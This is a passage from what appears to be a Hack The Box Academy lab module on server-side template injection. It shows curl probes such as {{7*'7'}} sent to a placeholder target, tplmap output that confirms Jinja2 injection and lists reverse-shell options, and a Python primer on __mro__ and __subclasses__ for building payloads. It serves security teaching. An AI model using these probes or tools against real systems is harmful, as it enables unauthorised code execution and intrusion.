<a id=__codelineno-2-33 name=__codelineno-2-33></a><span class=go>                &lt;a&gt;C:\&gt;&lt;input type=&quot;text&quot; name=&quot;cmd&quot; id=&quot;command&quot;&gt;&lt;/a&gt;</span>
<a id=__codelineno-2-34 name=__codelineno-2-34></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-2-35 name=__codelineno-2-35></a><span class=go>                &lt;a&gt;49&lt;/a&gt;</span>
<a id=__codelineno-2-36 name=__codelineno-2-36></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-2-37 name=__codelineno-2-37></a><span class=go>                &lt;input type=&quot;submit&quot; value=&quot;execute&quot;&gt;</span>
<a id=__codelineno-2-38 name=__codelineno-2-38></a><span class=go>            &lt;/form&gt;</span>
<a id=__codelineno-2-39 name=__codelineno-2-39></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-2-40 name=__codelineno-2-40></a><span class=go>        &lt;div class=&quot;window&quot; data-title=&quot;Windows&quot;&gt;</span>
<a id=__codelineno-2-41 name=__codelineno-2-41></a><span class=go>            &lt;h1&gt;Windows&lt;/h1&gt;</span>
<a id=__codelineno-2-42 name=__codelineno-2-42></a><span class=go>            &lt;p&gt;Minimize the windows to the taskbar, make them full screen or close them.&lt;/p&gt;</span>
<a id=__codelineno-2-43 name=__codelineno-2-43></a><span class=go>            &lt;p&gt;Drag the title bar to move the windows or resize them from the bottom right corner.&lt;/p&gt;</span>
<a id=__codelineno-2-44 name=__codelineno-2-44></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-2-45 name=__codelineno-2-45></a>
<a id=__codelineno-2-46 name=__codelineno-2-46></a><span class=go>        &lt;div id=&quot;taskbar&quot;&gt;      </span>
<a id=__codelineno-2-47 name=__codelineno-2-47></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-2-48 name=__codelineno-2-48></a>
<a id=__codelineno-2-49 name=__codelineno-2-49></a><span class=go>        &lt;div id=&quot;icons&quot;&gt;</span>
<a id=__codelineno-2-50 name=__codelineno-2-50></a><span class=go>            &lt;a class=&quot;openWindow&quot; data-id=&quot;0&quot;&gt;Run&lt;/a&gt;</span>
<a id=__codelineno-2-51 name=__codelineno-2-51></a><span class=go>            &lt;a class=&quot;openWindow&quot; data-id=&quot;1&quot;&gt;Welcome&lt;/a&gt;</span>
<a id=__codelineno-2-52 name=__codelineno-2-52></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-2-53 name=__codelineno-2-53></a><span class=go>        &lt;font size=&quot;5px&quot;&gt;&lt;a href=&quot;https://html5-templates.com/&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; id=&quot;templateLink&quot;&gt;&amp;copy; HTML5-Templates.com&lt;/a&gt;&lt;/font&gt;</span>
<a id=__codelineno-2-54 name=__codelineno-2-54></a><span class=go>        &lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;</span>
<a id=__codelineno-2-55 name=__codelineno-2-55></a><span class=go>    &lt;/div&gt;</span>
<a id=__codelineno-2-56 name=__codelineno-2-56></a><span class=go>&lt;/body&gt;</span>
</code></pre></div> <p>Luckily this time, the application evaluated the latest mathematical expression we submitted and returned the result, 49. It looks like we may be dealing with an SSTI vulnerability!</p> <p>As already mentioned, the first thing we need to do when dealing with <code>SSTI vulnerabilities</code> is to identify the template engine the application is utilizing. Once again, let's use PortSwigger's diagram in the SSTI Identification. We already know that the <code>{{7*7}}</code> expression was evaluated successfully. The next expression the diagram suggests trying is <code>{{7*'7'}}</code>. Let us try it and see how the application responds.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1></a><span class=gp>hrmns@htb[/htb]$ </span>curl -gs <span class=s2>&quot;http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd={{7*&#39;7&#39;}}&quot;</span>
<a id=__codelineno-3-2 name=__codelineno-3-2></a>
<a id=__codelineno-3-3 name=__codelineno-3-3></a><span class=go>&lt;!DOCTYPE html&gt;</span>
<a id=__codelineno-3-4 name=__codelineno-3-4></a><span class=go>&lt;html lang=&quot;en&quot;&gt;</span>
<a id=__codelineno-3-5 name=__codelineno-3-5></a><span class=go>&lt;style type=&quot;text/css&quot;&gt;</span>
<a id=__codelineno-3-6 name=__codelineno-3-6></a><span class=gp>    #</span><span class=nb>command</span> <span class=o>{</span>
<a id=__codelineno-3-7 name=__codelineno-3-7></a><span class=go>        resize: horizontal;</span>
<a id=__codelineno-3-8 name=__codelineno-3-8></a><span class=go>        background-color : transparent;</span>
<a id=__codelineno-3-9 name=__codelineno-3-9></a><span class=go>        border-color: transparent;</span>
<a id=__codelineno-3-10 name=__codelineno-3-10></a><span class=go>        font-size: 15px;</span>
<a id=__codelineno-3-11 name=__codelineno-3-11></a><span class=go>        width: 200px;</span>
<a id=__codelineno-3-12 name=__codelineno-3-12></a>
<a id=__codelineno-3-13 name=__codelineno-3-13></a><span class=go>    }</span>
<a id=__codelineno-3-14 name=__codelineno-3-14></a><span class=gp>    #</span>command:active <span class=o>{</span>
<a id=__codelineno-3-15 name=__codelineno-3-15></a><span class=go>        width: auto;   </span>
<a id=__codelineno-3-16 name=__codelineno-3-16></a><span class=go>    }</span>
<a id=__codelineno-3-17 name=__codelineno-3-17></a><span class=go>&lt;/style&gt;</span>
<a id=__codelineno-3-18 name=__codelineno-3-18></a><span class=go>&lt;head&gt;</span>
<a id=__codelineno-3-19 name=__codelineno-3-19></a><span class=go>    &lt;meta charset=&quot;utf-8&quot;&gt;</span>
<a id=__codelineno-3-20 name=__codelineno-3-20></a><span class=go>    &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;</span>
<a id=__codelineno-3-21 name=__codelineno-3-21></a><span class=go>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;</span>
<a id=__codelineno-3-22 name=__codelineno-3-22></a><span class=go>    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/jquery-ui.css&quot;&gt;</span>
<a id=__codelineno-3-23 name=__codelineno-3-23></a><span class=go>    &lt;script src=&quot;/static/js/jquery-1.12.4.js&quot;&gt;&lt;/script&gt;</span>
<a id=__codelineno-3-24 name=__codelineno-3-24></a><span class=go>    &lt;script src=&quot;/static/js/jquery-ui.js&quot;&gt;&lt;/script&gt;</span>
<a id=__codelineno-3-25 name=__codelineno-3-25></a><span class=go>    &lt;script src=&quot;/static/js/script.js&quot;&gt;&lt;/script&gt;    </span>
<a id=__codelineno-3-26 name=__codelineno-3-26></a><span class=go>    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/style.css&quot; /&gt;</span>
<a id=__codelineno-3-27 name=__codelineno-3-27></a><span class=go>    &lt;title&gt;Windows&lt;/title&gt;</span>
<a id=__codelineno-3-28 name=__codelineno-3-28></a><span class=go>&lt;/head&gt;</span>
<a id=__codelineno-3-29 name=__codelineno-3-29></a><span class=go>&lt;body&gt;</span>
<a id=__codelineno-3-30 name=__codelineno-3-30></a><span class=go>    &lt;div id=&quot;desktop&quot;&gt;</span>
<a id=__codelineno-3-31 name=__codelineno-3-31></a><span class=go>        &lt;div class=&quot;window&quot; data-title=&quot;Run&quot;&gt;</span>
<a id=__codelineno-3-32 name=__codelineno-3-32></a><span class=go>            &lt;form action=&quot;/execute&quot; method=&quot;get&quot;&gt;</span>
<a id=__codelineno-3-33 name=__codelineno-3-33></a><span class=go>                &lt;a&gt;C:\&gt;&lt;input type=&quot;text&quot; name=&quot;cmd&quot; id=&quot;command&quot;&gt;&lt;/a&gt;</span>
<a id=__codelineno-3-34 name=__codelineno-3-34></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-3-35 name=__codelineno-3-35></a><span class=go>                &lt;a&gt;7777777&lt;/a&gt;</span>
<a id=__codelineno-3-36 name=__codelineno-3-36></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-3-37 name=__codelineno-3-37></a><span class=go>                &lt;input type=&quot;submit&quot; value=&quot;execute&quot;&gt;</span>
<a id=__codelineno-3-38 name=__codelineno-3-38></a><span class=go>            &lt;/form&gt;</span>
<a id=__codelineno-3-39 name=__codelineno-3-39></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-3-40 name=__codelineno-3-40></a><span class=go>        &lt;div class=&quot;window&quot; data-title=&quot;Windows&quot;&gt;</span>
<a id=__codelineno-3-41 name=__codelineno-3-41></a><span class=go>            &lt;h1&gt;Windows&lt;/h1&gt;</span>
<a id=__codelineno-3-42 name=__codelineno-3-42></a><span class=go>            &lt;p&gt;Minimize the windows to the taskbar, make them full screen or close them.&lt;/p&gt;</span>
<a id=__codelineno-3-43 name=__codelineno-3-43></a><span class=go>            &lt;p&gt;Drag the title bar to move the windows or resize them from the bottom right corner.&lt;/p&gt;</span>
<a id=__codelineno-3-44 name=__codelineno-3-44></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-3-45 name=__codelineno-3-45></a>
<a id=__codelineno-3-46 name=__codelineno-3-46></a><span class=go>        &lt;div id=&quot;taskbar&quot;&gt;      </span>
<a id=__codelineno-3-47 name=__codelineno-3-47></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-3-48 name=__codelineno-3-48></a>
<a id=__codelineno-3-49 name=__codelineno-3-49></a><span class=go>        &lt;div id=&quot;icons&quot;&gt;</span>
<a id=__codelineno-3-50 name=__codelineno-3-50></a><span class=go>            &lt;a class=&quot;openWindow&quot; data-id=&quot;0&quot;&gt;Run&lt;/a&gt;</span>
<a id=__codelineno-3-51 name=__codelineno-3-51></a><span class=go>            &lt;a class=&quot;openWindow&quot; data-id=&quot;1&quot;&gt;Welcome&lt;/a&gt;</span>
<a id=__codelineno-3-52 name=__codelineno-3-52></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-3-53 name=__codelineno-3-53></a><span class=go>        &lt;font size=&quot;5px&quot;&gt;&lt;a href=&quot;https://html5-templates.com/&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot; id=&quot;templateLink&quot;&gt;&amp;copy; HTML5-Templates.com&lt;/a&gt;&lt;/font&gt;</span>
<a id=__codelineno-3-54 name=__codelineno-3-54></a><span class=go>        &lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;</span>
<a id=__codelineno-3-55 name=__codelineno-3-55></a><span class=go>    &lt;/div&gt;</span>
<a id=__codelineno-3-56 name=__codelineno-3-56></a><span class=go>&lt;/body&gt;</span>
</code></pre></div> <p>The application successfully evaluated this expression as well. According to PortSwigger's diagram, we are dealing with either a Jinja2 or a Twig template engine. That being said, the fact that {{7*'7'}} was evaluated with the application returning 7777777 means that Jinja2 is being utilized on the backend.</p> <p>We could have automated the template engine identification process we just executed through <code>tplmap</code>:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1></a><span class=gp>hrmns@htb[/htb]$ </span>./tplmap.py -u <span class=s1>&#39;http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd&#39;</span>
<a id=__codelineno-4-2 name=__codelineno-4-2></a>
<a id=__codelineno-4-3 name=__codelineno-4-3></a><span class=go>    Automatic Server-Side Template Injection Detection and Exploitation Tool</span>
<a id=__codelineno-4-4 name=__codelineno-4-4></a>
<a id=__codelineno-4-5 name=__codelineno-4-5></a><span class=go>[+] Testing if GET parameter &#39;cmd&#39; is injectable</span>
<a id=__codelineno-4-6 name=__codelineno-4-6></a><span class=go>[+] Smarty plugin is testing rendering with tag &#39;*&#39;</span>
<a id=__codelineno-4-7 name=__codelineno-4-7></a><span class=go>[+] Smarty plugin is testing blind injection</span>
<a id=__codelineno-4-8 name=__codelineno-4-8></a><span class=go>[+] Mako plugin is testing rendering with tag &#39;${*}&#39;</span>
<a id=__codelineno-4-9 name=__codelineno-4-9></a><span class=go>[+] Mako plugin is testing blind injection</span>
<a id=__codelineno-4-10 name=__codelineno-4-10></a><span class=go>[+] Python plugin is testing rendering with tag &#39;str(*)&#39;</span>
<a id=__codelineno-4-11 name=__codelineno-4-11></a><span class=go>[+] Python plugin is testing blind injection</span>
<a id=__codelineno-4-12 name=__codelineno-4-12></a><span class=go>[+] Tornado plugin is testing rendering with tag &#39;{{*}}&#39;</span>
<a id=__codelineno-4-13 name=__codelineno-4-13></a><span class=go>[+] Tornado plugin is testing blind injection</span>
<a id=__codelineno-4-14 name=__codelineno-4-14></a><span class=go>[+] Jinja2 plugin is testing rendering with tag &#39;{{*}}&#39;</span>
<a id=__codelineno-4-15 name=__codelineno-4-15></a><span class=go>[+] Jinja2 plugin has confirmed injection with tag &#39;{{*}}&#39;</span>
<a id=__codelineno-4-16 name=__codelineno-4-16></a><span class=go>[+] Tplmap identified the following injection point:</span>
<a id=__codelineno-4-17 name=__codelineno-4-17></a>
<a id=__codelineno-4-18 name=__codelineno-4-18></a><span class=go>  GET parameter: cmd</span>
<a id=__codelineno-4-19 name=__codelineno-4-19></a><span class=go>  Engine: Jinja2</span>
<a id=__codelineno-4-20 name=__codelineno-4-20></a><span class=go>  Injection: {{*}}</span>
<a id=__codelineno-4-21 name=__codelineno-4-21></a><span class=go>  Context: text</span>
<a id=__codelineno-4-22 name=__codelineno-4-22></a><span class=go>  OS: posix-linux</span>
<a id=__codelineno-4-23 name=__codelineno-4-23></a><span class=go>  Technique: render</span>
<a id=__codelineno-4-24 name=__codelineno-4-24></a><span class=go>  Capabilities:</span>
<a id=__codelineno-4-25 name=__codelineno-4-25></a>
<a id=__codelineno-4-26 name=__codelineno-4-26></a><span class=go>   Shell command execution: ok</span>
<a id=__codelineno-4-27 name=__codelineno-4-27></a><span class=go>   Bind and reverse shell: ok</span>
<a id=__codelineno-4-28 name=__codelineno-4-28></a><span class=go>   File write: ok</span>
<a id=__codelineno-4-29 name=__codelineno-4-29></a><span class=go>   File read: ok</span>
<a id=__codelineno-4-30 name=__codelineno-4-30></a><span class=go>   Code evaluation: ok, python code</span>
<a id=__codelineno-4-31 name=__codelineno-4-31></a>
<a id=__codelineno-4-32 name=__codelineno-4-32></a><span class=go>[+] Rerun tplmap providing one of the following options:</span>
<a id=__codelineno-4-33 name=__codelineno-4-33></a>
<a id=__codelineno-4-34 name=__codelineno-4-34></a><span class=go>    --os-shell              Run shell on the target</span>
<a id=__codelineno-4-35 name=__codelineno-4-35></a><span class=go>    --os-cmd                Execute shell commands</span>
<a id=__codelineno-4-36 name=__codelineno-4-36></a><span class=go>    --bind-shell PORT           Connect to a shell bind to a target port</span>
<a id=__codelineno-4-37 name=__codelineno-4-37></a><span class=go>    --reverse-shell HOST PORT   Send a shell back to the attacker&#39;s port</span>
<a id=__codelineno-4-38 name=__codelineno-4-38></a><span class=go>    --upload LOCAL REMOTE   Upload files to the server</span>
<a id=__codelineno-4-39 name=__codelineno-4-39></a><span class=go>    --download REMOTE LOCAL Download remote files</span>
</code></pre></div> <p>The next step is to gain remote code execution on the target server. Before moving to the payload development part, let's look at some Python for SSTI.</p> <hr> <h2 id=python-primer-for-ssti>Python Primer for SSTI<a class=headerlink href=#python-primer-for-ssti title="Permanent link">&para;</a></h2> <p>Below is a small dictionary from <a href=https://www.fatalerrors.org/a/0dhx1Dk.html>fatalerrors.org</a> to refer to when going over the Jinja2 payload development part</p> <table> <thead> <tr> <th><strong>No.</strong></th> <th><strong>Methods</strong></th> <th><strong>Description</strong></th> </tr> </thead> <tbody> <tr> <td>1.</td> <td><code>__class__</code></td> <td>Returns the object (class) to which the type belongs</td> </tr> <tr> <td>2.</td> <td><code>__mro__</code></td> <td>Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples.</td> </tr> <tr> <td>3.</td> <td><code>__subclasses__</code></td> <td>Each new class retains references to subclasses, and this method returns a list of references that are still available in the class</td> </tr> <tr> <td>4.</td> <td><code>__builtins__</code></td> <td>Returns the builtin methods included in a function</td> </tr> <tr> <td>5.</td> <td><code>__globals__</code></td> <td>A reference to a dictionary that contains global variables for a function</td> </tr> <tr> <td>6.</td> <td><code>__base__</code></td> <td>Returns the base class inherited by the object &lt;-- (__ base__ and __ mro__ are used to find the base class)</td> </tr> <tr> <td>7.</td> <td><code>__init__</code></td> <td>Class initialization method</td> </tr> </tbody> </table> <div class=highlight><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1></a><span class=gp>hrmns@htb[/htb]$ </span>python3
<a id=__codelineno-5-2 name=__codelineno-5-2></a>
<a id=__codelineno-5-3 name=__codelineno-5-3></a><span class=go>Python 3.9.2 (default, Feb 28 2021, 17:03:44) </span>
<a id=__codelineno-5-4 name=__codelineno-5-4></a><span class=go>[GCC 10.2.1 20210110] on linux</span>
<a id=__codelineno-5-5 name=__codelineno-5-5></a><span class=go>Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span>
<a id=__codelineno-5-6 name=__codelineno-5-6></a><span class=go>&gt;&gt;&gt; </span>
</code></pre></div> <p>Create a string object and use <code>type</code> and <code>__class__</code>, as follows. Then use the <code>dir()</code> command to show all methods and attributes from the object.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1></a><span class=o>&gt;&gt;&gt;</span> <span class=kn>import</span> <span class=nn>flask</span>
<a id=__codelineno-6-2 name=__codelineno-6-2></a><span class=o>&gt;&gt;&gt;</span> <span class=n>s</span> <span class=o>=</span> <span class=s1>&#39;HTB&#39;</span>
<a id=__codelineno-6-3 name=__codelineno-6-3></a><span class=o>&gt;&gt;&gt;</span> <span class=nb>type</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
<a id=__codelineno-6-4 name=__codelineno-6-4></a>
<a id=__codelineno-6-5 name=__codelineno-6-5></a><span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>str</span><span class=s1>&#39;&gt;</span>
<a id=__codelineno-6-6 name=__codelineno-6-6></a>
<a id=__codelineno-6-7 name=__codelineno-6-7></a>
<a id=__codelineno-6-8 name=__codelineno-6-8></a><span class=o>&gt;&gt;&gt;</span> <span class=n>s</span><span class=o>.</span><span class=vm>__class__</span>
<a id=__codelineno-6-9 name=__codelineno-6-9></a>
<a id=__codelineno-6-10 name=__codelineno-6-10></a><span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>str</span><span class=s1>&#39;&gt;</span>
<a id=__codelineno-6-11 name=__codelineno-6-11></a>
<a id=__codelineno-6-12 name=__codelineno-6-12></a>
<a id=__codelineno-6-13 name=__codelineno-6-13></a><span class=o>&gt;&gt;&gt;</span> <span class=nb>dir</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
<a id=__codelineno-6-14 name=__codelineno-6-14></a>
<a id=__codelineno-6-15 name=__codelineno-6-15></a><span class=p>[</span><span class=s1>&#39;__add__&#39;</span><span class=p>,</span> <span class=s1>&#39;__class__&#39;</span><span class=p>,</span> <span class=s1>&#39;__contains__&#39;</span><span class=p>,</span> <span class=s1>&#39;__delattr__&#39;</span><span class=p>,</span> <span class=s1>&#39;__dir__&#39;</span><span class=p>,</span> <span class=s1>&#39;__doc__&#39;</span><span class=p>,</span> <span class=s1>&#39;__eq__&#39;</span><span class=p>,</span> <span class=s1>&#39;__format__&#39;</span><span class=p>,</span> <span class=s1>&#39;__ge__&#39;</span><span class=p>,</span> <span class=s1>&#39;__getattribute__&#39;</span><span class=p>,</span> <span class=s1>&#39;__getitem__&#39;</span><span class=p>,</span> <span class=s1>&#39;__getnewargs__&#39;</span><span class=p>,</span> <span class=s1>&#39;__gt__&#39;</span><span class=p>,</span> <span class=s1>&#39;__hash__&#39;</span><span class=p>,</span> <span class=s1>&#39;__init__&#39;</span><span class=p>,</span> <span class=s1>&#39;__init_subclass__&#39;</span><span class=p>,</span> <span class=s1>&#39;__iter__&#39;</span><span class=p>,</span> <span class=s1>&#39;__le__&#39;</span><span class=p>,</span> <span class=s1>&#39;__len__&#39;</span><span class=p>,</span> <span class=s1>&#39;__lt__&#39;</span><span class=p>,</span> <span class=s1>&#39;__mod__&#39;</span><span class=p>,</span> <span class=s1>&#39;__mul__&#39;</span><span class=p>,</span> <span class=s1>&#39;__ne__&#39;</span><span class=p>,</span> <span class=s1>&#39;__new__&#39;</span><span class=p>,</span> <span class=s1>&#39;__reduce__&#39;</span><span class=p>,</span> <span class=s1>&#39;__reduce_ex__&#39;</span><span class=p>,</span> <span class=s1>&#39;__repr__&#39;</span><span class=p>,</span> <span class=s1>&#39;__rmod__&#39;</span><span class=p>,</span> <span class=s1>&#39;__rmul__&#39;</span><span class=p>,</span> <span class=s1>&#39;__setattr__&#39;</span><span class=p>,</span> <span class=s1>&#39;__sizeof__&#39;</span><span class=p>,</span> <span class=s1>&#39;__str__&#39;</span><span class=p>,</span> <span class=s1>&#39;__subclasshook__&#39;</span><span class=p>,</span> <span class=s1>&#39;capitalize&#39;</span><span class=p>,</span> <span class=s1>&#39;casefold&#39;</span><span class=p>,</span> <span class=s1>&#39;center&#39;</span><span class=p>,</span> <span class=s1>&#39;count&#39;</span><span class=p>,</span> <span class=s1>&#39;encode&#39;</span><span class=p>,</span> <span class=s1>&#39;endswith&#39;</span><span class=p>,</span> <span class=s1>&#39;expandtabs&#39;</span><span class=p>,</span> <span class=s1>&#39;find&#39;</span><span class=p>,</span> <span class=s1>&#39;format&#39;</span><span class=p>,</span> <span class=s1>&#39;format_map&#39;</span><span class=p>,</span> <span class=s1>&#39;index&#39;</span><span class=p>,</span> <span class=s1>&#39;isalnum&#39;</span><span class=p>,</span> <span class=s1>&#39;isalpha&#39;</span><span class=p>,</span> <span class=s1>&#39;isascii&#39;</span><span class=p>,</span> <span class=s1>&#39;isdecimal&#39;</span><span class=p>,</span> <span class=s1>&#39;isdigit&#39;</span><span class=p>,</span> <span class=s1>&#39;isidentifier&#39;</span><span class=p>,</span> <span class=s1>&#39;islower&#39;</span><span class=p>,</span> <span class=s1>&#39;isnumeric&#39;</span><span class=p>,</span> <span class=s1>&#39;isprintable&#39;</span><span class=p>,</span> <span class=s1>&#39;isspace&#39;</span><span class=p>,</span> <span class=s1>&#39;istitle&#39;</span><span class=p>,</span> <span class=s1>&#39;isupper&#39;</span><span class=p>,</span> <span class=s1>&#39;join&#39;</span><span class=p>,</span> <span class=s1>&#39;ljust&#39;</span><span class=p>,</span> <span class=s1>&#39;lower&#39;</span><span class=p>,</span> <span class=s1>&#39;lstrip&#39;</span><span class=p>,</span> <span class=s1>&#39;maketrans&#39;</span><span class=p>,</span> <span class=s1>&#39;partition&#39;</span><span class=p>,</span> <span class=s1>&#39;replace&#39;</span><span class=p>,</span> <span class=s1>&#39;rfind&#39;</span><span class=p>,</span> <span class=s1>&#39;rindex&#39;</span><span class=p>,</span> <span class=s1>&#39;rjust&#39;</span><span class=p>,</span> <span class=s1>&#39;rpartition&#39;</span><span class=p>,</span> <span class=s1>&#39;rsplit&#39;</span><span class=p>,</span> <span class=s1>&#39;rstrip&#39;</span><span class=p>,</span> <span class=s1>&#39;split&#39;</span><span class=p>,</span> <span class=s1>&#39;splitlines&#39;</span><span class=p>,</span> <span class=s1>&#39;startswith&#39;</span><span class=p>,</span> <span class=s1>&#39;strip&#39;</span><span class=p>,</span> <span class=s1>&#39;swapcase&#39;</span><span class=p>,</span> <span class=s1>&#39;title&#39;</span><span class=p>,</span> <span class=s1>&#39;translate&#39;</span><span class=p>,</span> <span class=s1>&#39;upper&#39;</span><span class=p>,</span> <span class=s1>&#39;zfill&#39;</span><span class=p>]</span>
</code></pre></div> <p>The next step is to understand Python's hierarchy. Using <code>__mro__</code> or <code>mro()</code>, we can go back up to three inherited objects in the Python environment. Let's practice this as follows.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-7-1 name=__codelineno-7-1></a><span class=o>&gt;&gt;&gt;</span> <span class=n>s</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__class__</span>
<a id=__codelineno-7-2 name=__codelineno-7-2></a>
<a id=__codelineno-7-3 name=__codelineno-7-3></a><span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>type</span><span class=s1>&#39;&gt;</span>
<a id=__codelineno-7-4 name=__codelineno-7-4></a>
<a id=__codelineno-7-5 name=__codelineno-7-5></a>
<a id=__codelineno-7-6 name=__codelineno-7-6></a><span class=o>&gt;&gt;&gt;</span> <span class=n>s</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=n>__base__</span>
<a id=__codelineno-7-7 name=__codelineno-7-7></a>
<a id=__codelineno-7-8 name=__codelineno-7-8></a><span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>object</span><span class=s1>&#39;&gt;</span>
<a id=__codelineno-7-9 name=__codelineno-7-9></a>
<a id=__codelineno-7-10 name=__codelineno-7-10></a>
<a id=__codelineno-7-11 name=__codelineno-7-11></a><span class=o>&gt;&gt;&gt;</span> <span class=n>s</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=n>__base__</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span>
<a id=__codelineno-7-12 name=__codelineno-7-12></a>
<a id=__codelineno-7-13 name=__codelineno-7-13></a><span class=p>[</span><span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>type</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>weakref</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>weakcallableproxy</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>weakproxy</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>int</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>bytearray</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>bytes</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>list</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>NoneType</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>NotImplementedType</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>traceback</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>super</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>range</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>dict</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>dict_keys</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>dict_values</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>dict_items</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>dict_reversekeyiterator</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>dict_reversevalueiterator</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>dict_reverseitemiterator</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>odict_iterator</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>set</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>str</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>slice</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>staticmethod</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>complex</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>float</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>frozenset</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>property</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>managedbuffer</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>memoryview</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>tuple</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>enumerate</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>reversed</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>stderrprinter</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>code</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>frame</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>builtin_function_or_method</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>method</span><span class=s1>&#39;&gt;,</span>
<a id=__codelineno-7-14 name=__codelineno-7-14></a> <span class=o>&lt;</span><span class=n>SNIP</span><span class=o>&gt;</span>
<a id=__codelineno-7-15 name=__codelineno-7-15></a>
<a id=__codelineno-7-16 name=__codelineno-7-16></a>
<a id=__codelineno-7-17 name=__codelineno-7-17></a><span class=o>&gt;&gt;&gt;</span> <span class=n>s</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=n>mro</span><span class=p>()[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span>
<a id=__codelineno-7-18 name=__codelineno-7-18></a>
